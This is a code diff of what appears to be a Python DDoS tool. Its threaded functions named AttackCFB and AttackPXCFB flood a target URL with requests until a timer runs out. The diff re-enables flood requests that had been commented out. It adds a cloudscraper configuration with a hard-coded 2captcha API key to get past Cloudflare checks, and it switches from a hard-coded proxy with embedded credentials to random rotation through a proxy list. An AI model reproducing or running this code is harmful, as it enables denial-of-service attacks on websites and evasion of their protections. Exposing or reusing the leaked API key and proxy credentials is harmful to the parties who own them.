@@ -55,7 +55,6 @@ def get_proxies():
         return False
     proxies = open("./proxy.txt", 'r').read().split('\n')
 
-    print("proxies",proxies)
     return True
 
 def get_cookie(url):
@@ -502,8 +501,8 @@ def AttackCFB(url, until_datetime, scraper):
         try:
             print(scraper.get(url, timeout=15))
             print(scraper.get(url, timeout=15))
-            # scraper.get(url, timeout=15)
-            # scraper.get(url, timeout=15)
+            scraper.get(url, timeout=15)
+            scraper.get(url, timeout=15)
         except:
             pass
 #endregion
@@ -511,7 +510,13 @@ def AttackCFB(url, until_datetime, scraper):
 #region PXCFB
 def LaunchPXCFB(url, th, t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
-    scraper = cloudscraper.create_scraper()
+    scraper = cloudscraper.create_scraper( browser={
+
+    'provider': '2captcha',
+
+    'api_key': 'ef9e368b1b69cadb030fa20473ccd0c4'
+
+    })
     for _ in range(int(th)):
         try:
             thd = threading.Thread(target=AttackPXCFB, args=(url, until, scraper))
@@ -522,15 +527,19 @@ def LaunchPXCFB(url, th, t):
 def AttackPXCFB(url, until_datetime, scraper):
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
         try:
-            proxy = {
-                    'http': 'http://hjzppqac:5kklb5fkdx84@45.127.248.127:5128',   
-                    'https': 'http://hjzppqac:5kklb5fkdx84@45.127.248.127:5128',
-            }
-            
-            print(scraper.get(url, proxies=proxy),proxy)
-            print(scraper.get(url, proxies=proxy),proxy)
-        except:
-            print('falid')
+            if get_proxies():
+                proxies = open("./proxy.txt", 'r').read().split('\n')
+
+                proxy = random.choice(proxies).strip().split(":")
+                proxy_url = f"http://{proxy[2]}:{proxy[3]}@{proxy[0]}:{proxy[1]}"
+                proxies = {
+                'http': proxy_url,
+                }
+             
+                print(requests.get(url, proxies=proxies),proxy_url)
+                # print(scraper.get(url, proxies=proxy),proxy)
+        except Exception as e:
+            print('falid--------------',e)
             pass
 #endregion
 
